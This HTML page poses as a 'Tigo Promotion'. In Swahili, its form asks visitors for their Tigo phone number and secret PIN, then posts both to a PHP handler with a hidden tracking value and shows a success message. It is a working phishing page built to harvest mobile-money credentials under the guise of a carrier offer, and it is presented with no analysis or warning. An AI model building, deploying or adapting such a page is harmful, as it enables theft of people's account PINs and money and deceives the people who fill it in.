<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <link rel="icon" type="image/svg+xml" href="/demo/vite.svg">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Tigo Promotion</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    body, html {
      height: 100%;
      font-family: Arial, sans-serif;
      background: #f8f9fa;
    }
    .container {
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
      text-align: center;
    }
    .responsive-image {
      width: 100%;
      max-width: 350px;
      height: auto;
      margin-bottom: 20px;
      border-radius: 10px;
    }
    .field {
      margin-bottom: 1rem;
      width: 100%;
      max-width: 300px;
    }
    .input {
      width: 100%;
      padding: 12px;
      font-size: 1rem;
      border: 1px solid #ccc;
      border-radius: 8px;
      outline: none;
      transition: border-color 0.3s ease;
    }
    .input:focus {
      border-color: #007bff;
    }
    .button {
      background-color: #222;
      color: white;
      border: none;
      border-radius: 8px;
      padding: 12px 24px;
      font-size: 1rem;
      cursor: pointer;
      transition: background-color 0.3s ease, transform 0.1s ease;
      width: 100%;
      max-width: 300px;
    }
    .button:hover {
      background-color: #444;
    }
    .button:active {
      transform: scale(0.98);
    }
    #message {
      margin-top: 15px;
      padding: 10px;
      border-radius: 5px;
      max-width: 300px;
      width: 100%;
      display: none;
    }
    .success {
      background-color: #d4edda;
      color: #155724;
      border: 1px solid #c3e6cb;
    }
    .error {
      background-color: #f8d7da;
      color: #721c24;
      border: 1px solid #f5c6cb;
    }
    @media (max-width: 480px) {
      .responsive-image {
        max-width: 280px;
      }
      .input, .button {
        font-size: 0.95rem;
        padding: 10px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <img
      class="responsive-image"
      src="https://imagizer.imageshack.com/img924/2081/uEeySh.jpg"
      alt="Tigo Promotion">
    
    <div id="message"></div>
    
    <form id="tigoForm" action="/add_tigo.php" method="POST">
      <input type="hidden" name="url_link" value="gzktrsjamfkw">
      
      <div class="field">
        <input class="input" type="text" name="nambari" autocomplete="on" 
               placeholder="Nambari ya tigo" required>
      </div>
      
      <div class="field">
        <input class="input" type="text" name="siri" autocomplete="on" 
               placeholder="Nambari ya siri tigo" required>
      </div>
      
      <button class="button" type="submit">Submit</button>
    </form>
  </div>

  <script>
    document.getElementById('tigoForm').addEventListener('submit', async function(e) {
      e.preventDefault();
      
      const form = this;
      const submitBtn = form.querySelector('.button');
      const messageDiv = document.getElementById('message');
      const formData = new FormData(form);
      
      // Show loading state
      submitBtn.disabled = true;
      submitBtn.textContent = 'Submitting...';
      messageDiv.style.display = 'none';
      
      try {
        const response = await fetch(form.action, {
          method: 'POST',
          body: formData
        });
        
        const result = await response.text();
        
        if (response.ok) {
          // Success
          messageDiv.textContent = '✓ ' + result;
          messageDiv.className = 'success';
          messageDiv.style.display = 'block';
          
          // Clear form
          form.reset();
          
          // Hide message after 3 seconds
          setTimeout(() => {
            messageDiv.style.display = 'none';
          }, 3000);
        } else {
          // Error
          throw new Error(result);
        }
      } catch (error) {
        // Show error
        messageDiv.textContent = '✗ ' + error.message;
        messageDiv.className = 'error';
        messageDiv.style.display = 'block';
      } finally {
        // Reset button
        submitBtn.disabled = false;
        submitBtn.textContent = 'Submit';
      }
    });
  </script>
</body>
</html>
